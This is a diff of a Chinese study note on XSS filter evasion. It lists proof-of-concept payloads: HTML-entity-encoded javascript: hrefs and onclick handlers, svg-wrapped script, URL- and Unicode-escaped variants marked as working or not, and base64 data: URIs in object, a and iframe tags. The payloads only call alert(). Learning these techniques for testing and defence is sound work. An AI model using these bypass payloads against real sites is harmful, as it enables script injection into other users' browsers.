@@ -47,10 +47,6 @@
 
 > 例如onclick="myFunc()"这样的事件可以执行JavaScript，它也支持onclick="javascript:alert();"这种伪协议的写法，在浏览器打开javascript：URL的时候，它会将url当作JavaScript代码运行，当返回值不为undefined的时候，=前的属性将会被赋值为JavaScript的执行结果。
 > 
-> src、href等属性的合法内容除了是url外，还可以直接跟内容，例如\<a href="data:text/html;base64, PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">\</a>，JavaScript伪协议的最后一条语句执行产生的字符串将被视为数据内容。
-> 
-> 注意“当返回值不为undefined的时候”，url可以是用分号分割的多条JavaScript语句，这意味着当我们希望攻击更隐蔽的发生时，可以采用href=" javascript:window.open("about:blank");void 0;"这样的写法，最后的void 0 将会使前面的JavaScript代码无法改变当前页面的dom元素。
-> 
 > 支持JavaScript伪协议的有src、href等可以加载链接的属性，也有例如onclick、onload这样的事件
 
 ##### \<a href="" target="\_blank">中的target="\_blank"限制JavaScript伪协议的作用
@@ -67,10 +63,15 @@ target="\_blank"属性是表明按照href的链接打开一个新窗口，当hre
 
 ##### html实体编码
 
-> HTML实体编码有三种写法，实体名称\&lt; 十进制实体编码\&#60; 十六进制实体编码\&#x003c。HTML实体编码可以用于编辑“数据状态中的字符引用”、“属性值状态中的字符引用” 和 “RCDATA状态中的字符引用” 
+**编码方式**
+
+* HTML实体编码有三种写法，实体名称\&lt; 十进制实体编码\&#60; 十六进制实体编码\&#x003c。HTML实体编码可以用于编辑“数据状态中的字符引用”、“属性值状态中的字符引用” 和 “RCDATA状态中的字符引用” 
+* 在线编码：[在线Html实体编码解码-HTML Entity Encoding/Decoding (config.net.cn)](https://config.net.cn/tools/HtmlEncode.html)
+
+**无关紧要分析**
 
 * 数据状态中的字符引用：数据状态就是解析一个标签内里面的内容，如 `<div>...</div>` 中的内容
-* 属性值状态中的字符引用：属性值状态中的字符引用就好理解了，就是src，herf这样的属性值中的HTML实体，他也是会先进行HTML解码的，比如下面的语句，会先对里面HTML解码，然后再继续往下执行
+* 属性值状态中的字符引用：属性值状态中的字符引用就好理解了，就是src，href这样的属性值中的HTML实体，他也是会先进行HTML解码的，比如下面的语句，会先对里面HTML解码，然后再继续往下执行
 
 ```html
 <a href=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x22;&#x78;&#x73;&#x73;&#x22;&#x29;>test</a>
@@ -94,13 +95,70 @@ target="\_blank"属性是表明按照href的链接打开一个新窗口，当hre
 
 ​    仅有\<p\>...\</p\>内的JavaScript执行
 
-* 总结：利用html实体编码进行绕过执行JavaScript只有在编码支持JavaScript伪协议的属性的属性值时有用，在其他地方试图使用HTML实体编码编码\<\> 属性值 标签名等是达不到效果的。虽然上面提到了用html实体编码编码\<script\>标签内的JavaScript代码也是不生效的，但是我们可以利用\<svg\>标签达成我们的目的，这一点后面再说。
+**总结**
 
-##### JavaScript编码
+* **属性值**可以采用html实体编码，这就意味着`onclick`等执行函数的属性和`href`等支持JavaScript伪协议的属性可以通过html实体编码绕过检测
+* `<svg>`内的`<script>`内的JavaScript脚本可以使用html实体编码
 
-\<img src=1 oNeRrOr=&#x00000061;&#x006c;&#x0065;&#x0072;&#x0074;&#x0028;&#x0031;&#x0029;\>
+```html
+<a href=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x22;&#x78;&#x73;&#x73;&#x22;&#x29;>test</a>
+<p onclick=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x22;&#x78;&#x73;&#x73;&#x22;&#x29;>ppp</p>
+<svg><script>&#x0061;&#x006c;&#x0065;&#x0072;&#x0074;&#x0028;&#x002f;&#x0061;&#x006c;&#x0065;&#x0072;&#x0074;&#x7f16;&#x7801;&#x002f;&#x0029;&#x003b;</script></svg>
+```
 
-见链接
+##### url编码
+
+* JavaScript伪协议有效
+
+```html
+<p>
+    <!-- JavaScript无效 -->
+	3号:<a href="javasc%72ipt:alert(1)">javascript中的r进行编码</a>
+</p>
+<p>
+    <!-- 有效 -->
+	4号:<a href="javascript:ale%72t(1)">alert(1)中的r进行编码</a>
+</p>
+<p>
+    <!-- 有效 -->
+	5号:<a href="javascript:alert%281)">alert(1)中的'('进行编码</a>
+</p>
+<!-- JavaScript无效 -->
+<img src=# onclick="alert%281)"/>
+<!-- JavaScript无效 -->
+<img src=# onclick="javascript:alert%281)"/>
+<!-- JavaScript无效 -->
+<img src=# onclick="ale%72t(1)"/>
+```
+
+
+
+##### unicode编码
+
+* 可以对属性值进行unicode编码，不能对`javascript:`和控制字符编码
+
+```html
+<p>
+	<!-- JavaScript无效 -->
+    3号:<a href="javasc\u0072ipt:alert(1)">javascript中的r进行编码</a>
+</p>
+<p>
+     <!-- 有效 -->
+    4号:<a href="javascript:ale\u0072t(1)">alert(1)中的r进行编码</a>
+</p>
+<p>
+    <!-- JavaScript无效 -->
+    5号:<a href="javascript:alert\u00281)">alert(1)中的(进行编码</a>
+</p>
+<!-- JavaScript无效 -->
+<p onclick="alert\u00281")>onclick</p>
+<!-- 有效 -->
+<p onclick="javascript:ale\u0072t(1)")>onclick</p>
+<!-- 有效 -->
+<p onclick="ale\u0072t(1)")>onclick</p>
+```
+
+
 
 ##### base64编码
 
@@ -108,6 +166,7 @@ target="\_blank"属性是表明按照href的链接打开一个新窗口，当hre
 <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
 <!--base64加密：PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg 解码：<script>alert(1)</script>-->
 <a href="data:text/html;base64, PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">test</a>
+<!-- cPGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg== -->
 <iframe src="data:text/html;base64, PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="></iframe>
 ```
 
